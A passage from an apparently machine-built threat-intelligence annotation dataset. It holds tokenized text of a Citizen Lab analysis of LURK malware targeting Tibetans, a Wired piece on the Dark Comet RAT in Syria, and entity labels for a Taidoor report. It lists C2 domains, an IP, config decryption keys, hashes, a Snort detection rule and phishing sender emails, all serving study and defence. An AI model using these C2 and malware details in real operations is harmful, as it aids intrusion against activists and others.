"AppData%\\Application", "Data\\Help\\CREATELINK.EXE", "%", "AppData%\\Help\\IconCacheEt", ".", "DAT", "%", "AppData%\\Help\\IconConfigEt", ".", "DAT"], ["%", "AppData\\\\Help\\iexplore.exe"], ["Additionally", ",", "the", "samples", "that", "use", "Excel", "as", "their", "vector", "also", "drop", "a", "clean", "file", ",", "opened", "after", "the", "malware", "executes", ":", "8", "Number", "10", "\u2013", "July", "2012", "%", "Temp%\\set.xls", "For", "persistence", ",", "the", "trojan", "also", "creates", "the", "following", "link", "in", "the", "Startup", "folder", ",", "pointing", "at", "the", "iexplore.exe", "binary", "in", "%", "AppData%", ":", "C:\\Documents", "and", "Settings\\user\\Start", "Menu\\Programs\\Startup\\iexplore.lnk", "The", "binary", "in", "%", "AppData%", "is", "only", "9", "KB", "and", "acts", "as", "a", "launcher", "."], ["IconConfigEt", "."], ["DAT", "is", "the", "trojan", "\u2019s", "configuration", "file", ",", "storing", "the", "C2", "server", "addresses", "and", "ports", ",", "as", "well", "as", "a", "campaign", "name", "identifier", "."], ["The", "file", "is", "mostly", "encrypted", ",", "with", "the", "campaign", "name", "stored", "in", "the", "clear", "."], ["The", "configuration", "options", "are", "read", "from", "the", "main", "executable", "using", "GetPrivateProfileStringW", "(", ")", ",", "a", "function", "for", "preregistry", "configuration", "storage", "."], ["This", "function", "is", "for", "backwards", "compatibility", "with", "pre", "-", "registry", "16", "-", "bit", "Windows", "applications", ",", "and", "is", "not", "commonly", "used", "in", "modern", "applications", "."], ["9", "Number", "10", "\u2013", "July", "2012", "Decryption", "of", "the", "configuration", "file", "is", "done", "in", "sub_4044B0", "(", ")", "using", "a", "key", "generated", "in", "sub_404430", "(", ")", "\u2014", "the", "default", "is", "0x11B29719", ",", "in", "the", "case", "of", "the", "more", "common", "version", "of", "the", "trojan", "the", "key", "is", "0x11B297A9", "."], ["Once", "the", "values", "have", "been", "read", "from", "the", "decrypted", "file", ",", "it", "is", "re", "-", "encrypted", "in", "sub_404560", "(", ")", "."], ["Encrypted", "on", "disk", "(", "default", "):", "Decrypted", ":", "Once", "the", "configuration", "file", "is", "decrypted", ",", "the", "values", "are", "still", "not", "readable", "."], ["Fortunately", ",", "the", "second", "layer", "decryption", "is", "an", "easy", "process", "\u2014", "just", "decrement", "each", "character", "by", "1", "."], ["The", "values", "read", "from", "the", "configuration", "file", "are", ":", "1", "."], ["Section", "[", "PPP", "]", ",", "key", "P", ":", "Primary", "C2", "server", "port", "number", "2", "."], ["Section", "[", "WWW", "]", ",", "key", "W", ":", "Primary", "C2", "server", "name", "3", "."], ["Section", "[", "PPP1", "]", ",", "key", "P1", ":", "Secondary", "C2", "server", "port", "number", "4", "."], ["Section", "[", "WWW1", "]", ",", "key", "W1", ":", "Secondary", "C2", "server", "name", "5", "."], ["Section", "[", "PPP2", "]", ",", "key", "P2", ":", "Tertiary", "C2", "server", "port", "number", "6", "."], ["Section", "[", "WWW2", "]", ",", "key", "W2", ":", "Tertiary", "C2", "server", "name", "7", "."], ["Section"], ["[", "MMM", "]", ",", "key", "M", ":", "Campaign", "name", "10", "Number", "10", "\u2013", "July", "2012", "In", "the", "configuration", "files", "we", "have", "looked", "at", "for", "this", "run", ",", "the", "primary", "server", "is", "dtl.dnsd.me:63", ",", "and", "the", "secondary", "server", "is", "dtl.eatuo.com:63", "."], ["Both", "dnsd.me", "and", "eatuo.com", "are", "dynamic", "DNS", "providers", ",", "and", "eatuo.com", "has", "the", "same", "domain", "registration", "information", "as", "the", "well", "-", "known", "Chinese", "provider", "3322.org", "."], ["No", "tertiary", "server", "is", "given", "."], ["The", "malware", "checks", "in", "sub_4040E0", "(", ")", "for", "a", "value", "of", "\u201c", "Mark", "\u201d", "in", "the", "registry", "at", "the", "following", "location", ":", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\DbxUpdateET\\", "If", "a", "value", "is", "not", "found", ",", "it", "is", "set", "with", "the", "campaign", "name", "read", "from", "the", "configuration", "file", "key", "M.", "Campaign", "Names"], ["The", "four", "samples", "we", "received", "use", "three", "different", "campaign", "names", ",", "identified", "as", "follows", "in", "value", "7", "of", "each", "configuration", "file", ":", "Droeshi", "final.doc", ":", "campaign", "i", "d", "TIBET"], ["July6thFinal.doc", ":", "campaign", "i", "d", "T706", "(", "note", "that", "the", "password", "on", "the", "file", "is", "also", "0706", ",", "keeping", "on", "theme", ")", "EIDHR_action_plan.xlsx", ":", "campaign", "i", "d", "T801", "Dharamsala", "August", "2012"], ["Full", "program.xls", ":", "campaign", "i", "d", "T801", "The", "campaign", "names", "strongly", "suggest", "that", "these", "runs", "are", "specific", "to", "the", "Tibetan", "community", ",", "and", "that", "the", "Txxx", "attacks", "may", "be", "coming", "from", "the", "same", "source", "."], ["The", "July6thFinal.doc", ",", "EIDHR_action_plan.xlsx", ",", "and", "Dharamsala", "August", "2012"], ["Full", "program.xls", "documents", "all", "drop", "the", "same", "trojan", ";", "the", "Droeshi", "final.doc", "trojan", "is", "slightly", "different", "(", "although", "uses", "much", "of", "the", "same", "code", ")", "."], ["Malware", "Analysis"], ["These", "samples", "match", "the", "behavior", "seen", "with", "other", "recorded", "instances", "of", "samples", "from", "this", "family", "in", "the", "wild", "."], ["LURK", "is", "also", "known", "as", "Troj", "~", "Agent", "-", "XAT", "(", "Sophos", ")", ",", "TROJ_MDROP.TPB", "and", "TROJ_MDROP.TPC", "(", "Trend", "Micro", ")", ",", "and", "can", "also", "be", "picked", "up", "by", "more", "general", "antivirus", "detection", "such", "as", "Generic", "PWS.y", "(", "McAfee", ")", "."], ["In", "11", "Number", "10", "\u2013", "July", "2012", "the", "sample", "analyzed", "by", "Sophos", ",", "the", "campaign", "ID", "is", "\u201c", "IE_0day", "\u201d", "\u2014", "not", "immediately", "related", "to", "attacks", "on", "the", "Tibetan", "community", "."], ["Many", "more", "samples", "within", "this", "family", "exist", "with", "reports", "online", "\u2014", "look", "for", "\u201c", "DbxUpdateET", "\u201d", "(", "where", "the", "campaign", "ID", "is", "stored", "in", "the", "registry", ")", "or", "the", "dropped", "files", "\u201c", "IconCacheEt", "\u201d", "and", "\u201c", "IconConfigEt", ".", "\u201d"], ["Another", "Tibetan", "-", "themed", "example", "using", "the", "dtl.eatuo.com", "domain", "was", "reported", "by", "ZenLab", "on", "March", "26", ",", "2012", "."], ["The", "LURK", "malware", "is", "also", "referenced", "with", "a", "description", "of", "the", "communication", "protocol", "in", "Command", "Five", "\u2019s", "paper", "\u201c", "Command", "and", "Control", "in", "the", "Fifth", "Domain", ".", "\u201d"], ["The", "network", "behavior", "we", "observed", "matches", "the", "described", "protocol", "."], ["An", "additional", "file", "with", "the", "T801", "campaign", "ID", "that", "we", "observed", "used", "twice", "was", "uploaded", "to", "ThreatExpert", "and", "can", "be", "found", "here", "."], ["Command", "and", "Control"], ["Information"], ["A", "port", "scan", "of", "the", "C2", "server", "shows", "the", "following", "ports", "are", "open", ":", "PORT", "STATE", "SERVICE", "VERSION", "21", "/", "tcp", "open", "tcpwrapped", "53", "/", "tcp", "open", "domain", "?"], ["80", "/", "tcp", "closed", "http", "81", "/", "tcp", "open", "hosts2", "-", "ns", "?"], ["135", "/", "tcp", "open", "msrpc", "Microsoft", "Windows", "RPC", "1026", "/", "tcp", "open", "msrpc", "Microsoft", "Windows", "RPC", "8080", "/", "tcp", "open", "http", "-", "proxy", "?"], ["In", "addition", "to", "port", "63", "(", "which", "is", "not", "shown", "as", "open", "in", "the", "above", "scan", ")", ",", "ports", "81", "and", "53", "are", "both", "LURK", "."], ["Network", "Traffic"], ["In", "addition", "to", "the", "dropped", "files", ",", "infected", "machines", "can", "be", "found", "on", "a", "network", "by", "looking", "for", "the", "following", "indications", "of", "compromise", ":", "\uf0b7", "DNS", "lookup", "of", "the", "C2", "domains", ":", "dtl.dnsd.me", ",", "dtl.eatuo.com", "\uf0b7", "Traffic", "to", "the", "C2", "IP", ":", "184.105.64.183", "\u2014", "this", "includes", "traffic", "over", "port", "53", ",", "which", "is", "normally", "DNS", "12", "Number", "10", "\u2013", "July", "2012", "\uf0b7", "TCP", "traffic", "over", "port", "53", "that", "begins", "with", "\u201c", "LURK0", "\u201d", "The", "beginning", "of", "a", "network", "connection", "to", "the", "C2", "server", "looks", "like", "this", ":"], ["If", "the", "C2", "is", "not", "actively", "responding", ",", "not", "much", "data", "will", "be", "transmitted", "beyond", "TCP", ":", "For", "detection", ",", "Jaime", "Blasco", "from", "AlienVault", "has", "written", "a", "Snort", "rule", "that", "will", "detect", "LURK", "traffic", "(", "originally", "found", "here", "):", "13", "Number", "10", "\u2013", "July", "2012", "alert", "tcp", "$", "HOME_NET", "any", "-", ">", "$", "EXTERNAL_NET", "$", "HTTP_PORTS", "(", "msg:\u201dAPT", "LURK", "communication", "protocol", "detected", "\u201d", ";", "flow", ":", "established", ",", "to_server", ";", "content:\u201d|4C", "55", "52", "4B", "30|", "\u201d", ";", "depth:5", ";", "reference", ":", "url", ",", "www.commandfive.com", "/", "papers", "/", "C5_APT_C2InTheFifthDomain.pdf", ";", "classtype", ":", "trojan", "-", "activity", ";", "sid:3000006", ";", "rev:1", ";)", "RECOMMENDATIONS", "\uf0b7", "Civil", "society", "organizations", ",", "particularly", "those", "working", "on", "issues", "related", "to", "Tibetan", "rights", ",", "should", "exercise", "caution", "with", "respect", "to", "any", "email", "containing", "a", "link", "or", "attachment", "."], ["As", "the", "targeted", "malware", "attacks", "analyzed", "in", "this", "report", "demonstrate", ",", "content", "used", "to", "induce", "a", "recipient", "to", "open", "a", "malicious", "file", "may", "at", "one", "point", "have", "actually", "been", "authentic", "and", "private", "\u2014", "and", "is", "that", "much", "more", "likely", "to", "appear", "legitimate", "."], ["For", "tips", "on", "other", "ways", "to", "detect", "probable", "malware", "attacks", "and", "prevent", "compromise", ",", "see", "Citizen", "Lab", "\u2019s", "Recommendations", "for", "Defending", "Against", "Targeted", "Cyber", "Threats", "."], ["\uf0b7", "Civil", "society", "organizations", "should", "be", "wary", "of", "emails", "attaching", "password", "-", "protected", "documents", "and", "providing", "said", "password", "in", "the", "email", "body", "."], ["Such", "purported", "\u201c", "security", "\u201d", "measures", "are", "not", "an", "indicator", "of", "authenticity", "."], ["\uf0b7", "Citizen", "Lab", "encourages", "civil", "society", "organizations", "and", "individuals", "working", "on", "human", "rights", "issues", "that", "have", "encountered", "these", "types", "of", "targeted", "malware", "attacks", "to", "contact", "us", "at", "hrthreats[AT]citizenlab.org", "."], ["We", "appreciate", "submission", "of", "data", ",", "which", "will", "help", "strengthen", "our", "analysis", "of", "cyber", "threats", "."], ["_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "_", "FOOTNOTES", "1", "On", "April", "1", ",", "1955", ",", "the", "governments", "of", "India", "and", "China", "signed", "a", "protocol", "by", "which", "India", "handed", "over", "control", "of", "communications", "services", "in", "Tibet", "to", "China", "."], ["See", "Protocol", "between", "the", "Governments", "of", "India", "and", "China"], ["Regarding", "the", "Handing", "Over", "of", "Postal", ",", "Telegraph", "and", "Public", "Telephone", "Services", "in", "the", "Tibet", "Region", "of", "China", "."], ["14", "Number", "10", "\u2013", "July", "2012", "2", "3", "The", "Fourteenth", "Dalai", "Lama"], ["Tenzin", "Gyatso", "was", "born", "on", "July", "6", ",", "1935", "."], ["The", "Thirteenth", "Dalai", "Lama", "Thupten", "Gyatso", "passed", "away", "on", "December", "17", ",", "1933", "."], ["15"]]}, {"vertexSet": [[{"name": "Jean-Pierre Lesueur", "pos": [2, 6], "sent_id": 3, "type": "Attacker"}], [{"name": "Dark Comet", "pos": [8, 10], "sent_id": 6, "type": "Malware"}], [{"name": "Syrian government", "pos": [17, 19], "sent_id": 6, "type": "Attacker"}], [{"name": "keylogger", "pos": [6, 7], "sent_id": 16, "type": "MalwareCharacteristics"}], [{"name": "Dark Comet", "pos": [0, 2], "sent_id": 17, "type": "Malware"}], [{"name": "recording video and audio", "pos": [11, 15], "sent_id": 17, "type": "MalwareCharacteristics"}], [{"name": "critics of the regime of Syrian President Bashar Assad", "pos": [12, 21], "sent_id": 21, "type": "ExploitTargetObject"}], [{"name": "Osama", "pos": [6, 7], "sent_id": 26, "type": "Person"}], [{"name": "activist in Damascus", "pos": [10, 13], "sent_id": 26, "type": "ExploitTargetObject"}], [{"name": "Blackshades", "pos": [32, 33], "sent_id": 52, "type": "Malware"}], [{"name": "Syrian activists", "pos": [10, 12], "sent_id": 57, "type": "ExploitTargetObject"}]], "labels": [{"r": "P2", "h": 0, "t": 1, "evidence": [3, 6]}, {"r": "P23", "h": 2, "t": 1, "evidence": [6]}, {"r": "P13", "h": 4, "t": 3, "evidence": [16, 17]}, {"r": "P13", "h": 4, "t": 5, "evidence": [17]}, {"r": "P18", "h": 8, "t": 7, "evidence": [26]}], "title": "201207WiredDarkComet", "sents": [["How", "the", "Boy", "Next", "Door", "Accidentally", "Built", "a", "Syrian", "Spy"], ["Tool", "wired.com/2012/07/dark-comet-syrian-spy-tool/"], ["Robert", "McMillan", "Jean", "-", "Pierre", "Lesueur", "."], ["Photo", ":", "Jean", "-", "Pierre", "Lesueur", "Jean", "-", "Pierre", "Lesueur", "is", "in", "many", "ways", "a", "typical", "22", "-", "year", "-", "old", "computer", "geek", "."], ["He", "lives", "outside", "of", "Paris", ",", "coding", "Java", "by", "day", "for", "a", "European", "company", "that", "processes", "airline", "tickets", "."], ["He", "likes", "playing", "the", "piano", "and", "reading", "Stephen", "Hawking", "."], ["But", "he", "'s", "also", "the", "man", "who", "built", "Dark", "Comet", "\u2013", "which", "was", "recently", "used", "by", "the", "Syrian", "government", "to", "steal", "information", "from", "the", "computers", "of", "activists", "fighting", "to", "overthrow", "it", "."], ["Dark", "Comet", "is", "a", "software", "application", "that", "gives", "you", "remote", "control", "over", "another", "computer", ",", "and", "Lesueur", "says", "he", "wrote", "it", "just", "to", "prove", "his", "programming", "cred", "."], ["That", "meant", "sharing", "the", "thing", "with", "the", "rest", "of", "the", "world", ",", "and", "after", "the", "Syrian", "government", "grabbed", "the", "tool", "from", "the", "net", ",", "Lesueur", "found", "himself", "at", "the", "center", "of", "an", "international", "firestorm", "."], ["He", "spoke", "with", "Wired", "Tuesday", "via", "online", "chat", "."], ["Sometimes", ",", "the", "boy", "next", "door", "can", "become", "a", "tool", "in", "a", "state", "-", "sponsored", "cyberespionage", "campaign", "."], ["That", "'s", "the", "power", "of", "the", "internet", "."], ["Although", "it", "was", "first", "developed", "in", "2008", ",", "Dark", "Comet", "mostly", "stayed", "under", "the", "radar", "until", "it", "was", "linked", "to", "Syria", "earlier", "this", "year", "."], ["Although", "Lesueur", "says", "he", "never", "intended", "it", "to", "be", "used", "illegally", ",", "Dark", "Comet", "is", "not", "the", "type", "of", "program", "anyone", "would", "want", "to", "discover", "on", "their", "PC", "."], ["1/3"], ["In", "short", ",", "it", "'s", "a", "silent", "spying", "machine", "."], ["There", "'s", "a", "password", "-", "stealing", "keylogger", "and", "a", "feature", "that", "helps", "it", "avoid", "detection", "by", "antivirus", "products", "."], ["Dark", "Comet", "can", "be", "used", "for", "spying", ",", "too", ",", "quietly", "recording", "video", "and", "audio", "from", "a", "computer", "once", "it", "'s", "installed", "."], ["According", "to", "Lesueur", ",", "Dark", "Comet", "is", "no", "worse", "than", "other", "hacking", "tools", "such", "as", "Metasploit", "or", "BackTrack", "Linux", ",", "which", "can", "be", "used", "both", "by", "legitimate", "security", "testers", "and", "criminals", "to", "launch", "online", "attacks", "against", "computers", "and", "test", "networks", "for", "security", "flaws", "."], ["Dlshad", "Othman", "first", "learned", "about", "Dark", "Comet", "in", "December", ",", "when", "a", "Syrian", "activist", "asked", "him", "to", "examine", "her", "computer", "after", "losing", "access", "to", "her", "e", "-", "mail", ",", "Skype", ",", "and", "Facebook", "account", "."], ["After", "a", "scan", ",", "Othman", "discovered", "Dark", "Comet", "sitting", "on", "the", "machine", "'s", "hard", "drive", "."], ["Dark", "Comet", "was", "another", "tool", "in", "an", "escalating", "computer", "espionage", "campaign", "targeting", "critics", "of", "the", "regime", "of", "Syrian", "President", "Bashar", "Assad", "."], ["\""], ["Because", "most", "of", "the", "Syrian", "people", "started", "to", "use", "secure", "connections", "and", "they", "[", "learned", "how", "to", "bypass", "]", "the", "censorship", "and", "surveillance", "of", "the", "internet", ",", "so", "the", "regime", "found", "it", "\u2019s", "better", "to", "use", "Trojans", "to", "arrest", "the", "people", ",", "\"", "says", "Othman", ",", "a", "Syrian", "activist", "and", "computer", "specialist", "who", "is", "also", "one", "of", "the", "U.S.", "State", "Department", "'s", "Internet", "Freedom", "Fellows", "."], ["He", "and", "other", "activists", "believe", "that", "the", "information", "stolen", "via", "Dark", "Comet", "led", "to", "many", "arrests", "within", "Syria", "."], ["Once", "one", "computer", "is", "infected", ",", "hackers", "use", "that", "activist", "'s", "computer", "as", "a", "stepping", "stone", "to", "try", "and", "infect", "others", ",", "typically", "by", "contacting", "them", "via", "Skype", "."], ["That", "'s", "what", "happened", "to", "\"", "Osama", ",", "\"", "an", "activist", "in", "Damascus", "who", "declined", "to", "give", "his", "last", "name", "."], ["About", "five", "months", "ago", ",", "a", "doctor", "friend", "of", "his", "received", "a", "file", "via", "Skype", "that", "appeared", "to", "have", "something", "to", "do", "with", "medicine", "and", "the", "Syrian", "revolution", ".", "\""], ["His", "account", "started", "to", "send", "this", "file", "to", "his", "contacts", "(", "including", "me", ")", "and", "as", "he", "is", "a", "doctor", ",", "many", "of", "his", "contacts", "trusted", "this", "file", ",", "\"", "he", "said", "."], ["Osama", "does", "n't", "know", "for", "certain", "that", "his", "friend", "was", "infected", "with", "Dark", "Comet", ",", "but", "it", "'s", "very", "likely", "that", "he", "was", "."], ["Researchers", "say", "that", "between", "November", "and", "May", ",", "this", "was", "a", "preferred", "remote", "access", "tool", "of", "the", "Syrian", "regime", "."], ["Morgan", "Marquis", "-", "Boire", "\u2013", "a", "researcher", "with", "Citizen", "Lab", ",", "a", "computer", "security", "research", "thinktank", "\u2013", "has", "identified", "16", "separate", "pieces", "of", "malicious", "software", "that", "use", "Dark", "Comet", "to", "send", "information", "back", "to", "computers", "located", "in", "Syria", "."], ["Typically", "these", "are", "Trojan", "horse", "programs", ",", "designed", "to", "look", "like", "legitimate", "files", "that", "activists", "would", "want", "to", "read", "."], ["The", "Trojan", "might", "look", "like", "a", ".pdf", "file", "or", "a", "Skype", "encryption", "tool", ",", "but", "it", "silently", "installs", "Dark"], ["Comet", "in", "the", "background", "."], ["Dark", "Comet", "is", "known", "as", "a", "remote", "administration", "tool", "."], ["Security", "experts", "call", "it", "a", "RAT", "."], ["Dark", "Comet", "was", "packaged", "with", "malicious", "software", "that", "would", "quietly", "install", "it", "when", "victims", "opened", "this", ".pdf", "."], ["Image", ":", "John", "Scott", "-", "Railton"], ["As", "word", "of", "Dark", "Comet", "'s", "use", "got", "out", ",", "Lesueur", "'s", "part", "-", "time", "project", "suddenly", "came", "under", "the", "spotlight", "."], ["The", "Electronic", "Frontier", "Foundation", ",", "antivirus", "companies", ",", "and", "online", "activists", "\"", "kept", "up", "steady", "stream", "of", "postings", "and", "reports", "of", "the", "use", "of", "Dark", "Comet", "in", "Syria", ",", "\"", "says", "John", "Scott", "-", "Railton", ",", "a", "doctoral", "student", "at", "UCLA", "School", "of", "Public", "Affairs", "who", "has", "worked", "2/3", "closely", "on", "the", "issue", "of", "malicious", "software", "in", "Syria", "."], ["\"", "I", "do", "n't", "think", "that", "this", "amount", "of", "pressure", "has", "ever", "been", "placed", "on", "the", "developer", "of", "a", "RAT", "before", "."], ["I", "ca", "n't", "imagine", "that"], ["[", "Lesueur", "]", "expected", "anything", "like", "this", "to", "come", "from", "his", "project", ".", "\""], ["At", "first", ",", "Lesueur", "wrote", "a", "removal", "tool", ",", "so", "victims", "could", "uninstall", "Dark", "Comet", ",", "but", "he", "kept", "the", "project", "alive", "."], ["But", "by", "the", "end", "of", "June", ",", "he", "was", "afraid", "."], ["Though", "he", "was", "n't", "the", "one", "doing", "the", "illegal", "activity", ",", "it", "was", "clear", "that", "his", "software", "was", "being", "misused", "\u2013", "not", "just", "by", "the", "Syrian", "government", ",", "but", "by", "untalented", "hackers", "Lesueur", "calls", "\"", "script", "-", "kiddies", ".", "\""], ["He", "started", "to", "worry", "about", "being", "arrested", "."], ["So", "on", "June", "28", ",", "he", "took", "down", "Dark", "Comet", "."], ["\"", "I", "removed", "all", "before", "one", "day", "it", "happened", ",", "\"", "he", "says", "."], ["\"", "I", "do", "n't", "want", "to", "lose", "my", "life", "for", "such", "a", "little", "thing", ".", "\""], ["Lesueur", "says", "the", "Syrian", "use", "was", "a", "factor", "in", "his", "decision", "to", "pull", "Dark", "Comet", ",", "but", "not", "the", "only", "one", "."], ["He", "wo", "n't", "spell", "out", "the", "exact", "reason", "he", "was", "worried", "about", "his", "arrest", ",", "but", "two", "days", "earlier", ",", "one", "of", "the", "apparent", "authors", "of", "another", "remote", "-", "access", "tool", "called", "Blackshades", "was", "arrested", "in", "Tuscon", ",", "Arizona", ",", "on", "hacking", "and", "malware", "distribution", "charges", "."], ["That", "arrest", "may", "have", "scared", "Lesueur", ",", "says", "Kevin", "Mitnick", ",", "a", "well", "-", "known", "information", "security", "consultant", "."], ["Lesueur", "says", "that", "it", "did", "not", "affect", "his", "decision", ".", "\""], ["The", "Blackshades", "author", "was", "in", "charge", "of", "a", "carding", "operation", ",", "\"", "he", "says", "."], ["\"", "It", "'s", "not", "the", "same", ".", "\""], ["Blackshades", ",", "coincidentally", ",", "is", "now", "being", "used", "against", "the", "Syrian", "activists", "much", "in", "the", "same", "way", "that", "Dark", "Comet", "was", ",", "says", "Marquis", "-", "Boire", "."], ["Mitnick", ",", "who", "has", "used", "Dark", "Comet", "in", "security", "demonstrations", ",", "does", "n't", "think", "Leseur", "should", "have", "abandoned", "his", "tool", "because", "it", "was", "being", "used", "illegally", "."], ["\"", "I", "do", "n't", "think", "that", "'s", "a", "good", "reason", "to", "stop", "development", "on", "it", ",", "because", "you", "always", "have", "bad", "actors", ",", "\"", "he", "says", "."], ["\"", "That", "'s", "just", "a", "fact", "of", "life", ".", "\""], ["This", "is", "n't", "the", "first", "time", "that", "a", "software", "developer", "has", "dropped", "a", "tool", "after", "getting", "some", "heat", "."], ["But", "what", "'s", "unusual", "is", "that", "Lesueur", "has", "been", "remarkably", "candid", "about", "everything", ",", "using", "his", "real", "name", ",", "talking", "about", "himself", "in", "detail", ",", "and", "explaining", "why", "he", "created", "the", "tool", "."], ["Lesueur", "\u2013", "who", "cut", "his", "teeth", "in", "a", "underground", "Trojan", "and", "RAT", "-", "writing", "forum", "called", "OpenSC", "\u2013", "says", "that", "although", "he", "made", "about", "2,000", "euros", "offering", "technical", "support", "for", "Dark", "Comet", ",", "he", "did", "n't", "charge", "for", "the", "software", "and", "was", "never", "in", "it", "for", "the", "money", "."], ["He", "'s", "now", "working", "on", "a", "new", "remote", "access", "tool", "that", "does", "n't", "include", "the", "controversial", "spying", "features", "that", "were", "in", "Dark", "Comet", "."], ["After", "Lesueur", "pulled", "Dark", "Comet", ",", "Kevin", "Mitnick", "asked", "him", "if", "he", "'d", "ever", "consider", "selling", "the", "source", "code", "to", "the", "tool", "."], ["Lesueur", "said", "no", "."], ["\"", "I", "do", "n\u2019t", "think", "he", "was", "out", "for", "money", ",", "\"", "Mitnick", "says", "."], ["\"", "I", "do", "n't", "think", "he", "was", "doing", "anything", "illegal", ".", "\""], ["Lesueur", "says", "he", "just", "wanted", "to", "make", "a", "name", "for", "himself", "in", "the", "hacker", "scene", "."], ["\"", "The", "whole", "development", "process", "of", "Dark", "Comet", "was", "a", "challenge", "for", "myself", ",", "\"", "he", "says", "."], ["\"", "I", "never", "imagined", "it", "would", "be", "used", "by", "a", "government", "for", "spying", ",", "\"", "he", "said", "."], ["\"", "If", "I", "had", "known", "that", ",", "I", "would", "never", "have", "created", "such", "a", "tool", ".", "\""], ["3/3"]]}, {"vertexSet": [[{"name": "Taidoor", "pos": [18, 19], "sent_id": 17, "type": "Malware"}], [{"name": "Trend Micro", "pos": [23, 25], "sent_id": 17, "type": "Organization"}], [{"name": "BKDR_SIMBOT", "pos": [26, 27], "sent_id": 17, "type": "Malware"}], [{"name": "Taiwan", "pos": [9, 10], "sent_id": 20, "type": "Country"}], [{"name": "Trend Micro\u2122", "pos": [5, 8], "sent_id": 22, "type": "Organization"}], [{"name": "Smart Protection Network\u2122", "pos": [8, 12], "sent_id": 22, "type": "Software"}], [{"name": "Taidoor", "pos": [1, 2], "sent_id": 28, "type": "Malware"}], [{"name": "March 4, 2009", "pos": [13, 17], "sent_id": 28, "type": "Time"}], [{"name": "Taiwanese government", "pos": [13, 15], "sent_id": 31, "type": "ExploitTargetObject"}], [{"name": "Taidoor", "pos": [1, 2], "sent_id": 34, "type": "Campaign"}], [{"name": "Microsoft Common Controls", "pos": [21, 24], "sent_id": 35, "type": "Software"}], [{"name": "CVE-2012- 0158", "pos": [26, 28], "sent_id": 35, "type": "Vulnerability"}], [{"name": "Taidoor", "pos": [12, 13], "sent_id": 36, "type": "Malware"}], [{"name": "Adobe Reader", "pos": [24, 26], "sent_id": 36, "type": "Software"}], [{"name": "Acrobat", "pos": [27, 28], "sent_id": 36, "type": "Software"}], [{"name": "Flash Player", "pos": [30, 32], "sent_id": 36, "type": "Software"}], [{"name": "CVE-20094324", "pos": [2, 3], "sent_id": 37, "type": "Vulnerability"}], [{"name": "CVE-2010-1297", "pos": [4, 7], "sent_id": 37, "type": "Vulnerability"}], [{"name": "CVE-2010-2883", "pos": [9, 12], "sent_id": 37, "type": "Vulnerability"}], [{"name": "CVE-20110611", "pos": [15, 16], "sent_id": 37, "type": "Vulnerability"}], [{"name": "CVE-2011-1269", "pos": [12, 15], "sent_id": 39, "type": "Vulnerability"}], [{"name": "CVE-20093129", "pos": [17, 18], "sent_id": 39, "type": "Vulnerability"}], [{"name": "Microsoft Office", "pos": [25, 27], "sent_id": 39, "type": "Software"}], [{"name": "Taidoor", "pos": [19, 20], "sent_id": 49, "type": "Malware"}], [{"name": "[2 characters].tmp", "pos": [17, 20], "sent_id": 50, "type": "File"}], [{"name": "~dfds3.reg", "pos": [17, 18], "sent_id": 51, "type": "File"}], [{"name": "aaaaa.php?id=bbbbbbcccccccccccc", "pos": [17, 18], "sent_id": 59, "type": "Indicator"}], [{"name": "Taidoor", "pos": [4, 5], "sent_id": 64, "type": "Malware"}], [{"name": "minaki.yang@yahoo.com", "pos": [12, 13], "sent_id": 69, "type": "Email"}], [{"name": "October 25, 2011", "pos": [3, 7], "sent_id": 70, "type": "Time"}], [{"name": "60.249.219.82", "pos": [5, 6], "sent_id": 71, "type": "Address"}], [{"name": "97ff2338e568fc382d41c30c31f89720", "pos": [3, 4], "sent_id": 72, "type": "MD5"}], [{"name": "60.249.219.82", "pos": [5, 6], "sent_id": 74, "type": "Address"}], [{"name": "5fd848000d68f45271a0e1abd5844493", "pos": [3, 4], "sent_id": 75, "type": "MD5"}], [{"name": "95273503@nccu.edu.tw", "pos": [2, 3], "sent_id": 76, "type": "Email"}], [{"name": "60.249.219.82", "pos": [5, 6], "sent_id": 78, "type": "Address"}], [{"name": "8406c1ae494add6e4f0e78b476fb4db0", "pos": [3, 4], "sent_id": 79, "type": "MD5"}], [{"name": "BKDR_SIMBOT", "pos": [15, 16], "sent_id": 90, "type": "Malware"}], [{"name": "BKDR_SIMBOT.SMXA", "pos": [4, 5], "sent_id": 92, "type": "Malware"}], [{"name": "BKDR_SIMBOT.SME", "pos": [0, 1], "sent_id": 93, "type": "Malware"}], [{"name": "SIMBOT", "pos": [9, 10], "sent_id": 93, "type": "MalwareFamily"}], [{"name": "Adobe Flash Player installer", "pos": [9, 13], "sent_id": 94, "type": "Obfuscation"}], [{"name": "SIMBOT", "pos": [4, 5], "sent_id": 99, "type": "Malware"}], [{"name": "HTTP", "pos": [8, 9], "sent_id": 101, "type": "MalwareCharacteristics"}], [{"name": "RC4 encryption", "pos": [11, 13], "sent_id": 101, "type": "MalwareCharacteristics"}], [{"name": "HKLM\\SOFTWARE\\McAfee", "pos": [4, 5], "sent_id": 105, "type": "Indicator"}], [{"name": "C++", "pos": [6, 7], "sent_id": 107, "type": "SourceCodeInformation"}], [{"name": "11,776 bytes", "pos": [14, 16], "sent_id": 107, "type": "SourceCodeInformation"}], [{"name": "WinHttp", "pos": [4, 5], "sent_id": 111, "type": "Indicator"}], [{"name": "Taidoor", "pos": [4, 5], "sent_id": 113, "type": "Malware"}], [{"name": "[C&C]/{5 random characters}.php?id={6 random numbers}{encrypted victim\u2019s MAC address}", "pos": [0, 11], "sent_id": 115, "type": "Indicator"}], [{"name": "MAC address", "pos": [3, 5], "sent_id": 116, "type": "SystemInformation"}], [{"name": "Taidoor", "pos": [12, 13], "sent_id": 142, "type": "Malware"}], [{"name": "Trend Micro", "pos": [18, 20], "sent_id": 142, "type": "Organization"}], [{"name": "Smart Protection Network", "pos": [20, 23], "sent_id": 142, "type": "Software"}], [{"name": "October 2010", "pos": [36, 38], "sent_id": 142, "type": "Time"}], [{"name": "Taidoor", "pos": [4, 5], "sent_id": 168, "type": "Campaign"}], [{"name": "Remote Access Trojan", "pos": [22, 25], "sent_id": 168, "type": "TrojanHorse"}], [{"name": "denial of service", "pos": [13, 16], "sent_id": 171, "type": "Exploit"}], [{"name": "solid patch management", "pos": [15, 18], "sent_id": 174, "type": "CourseOfAction"}], [{"name": "endpoint and network security", "pos": [19, 23], "sent_id": 174, "type": "CourseOfAction"}], [{"name": "firewall use", "pos": [24, 26], "sent_id": 174, "type": "CourseOfAction"}], [{"name": "data loss prevention", "pos": [2, 5], "sent_id": 175, "type": "CourseOfAction"}], [{"name": "Enhanced visibility", "pos": 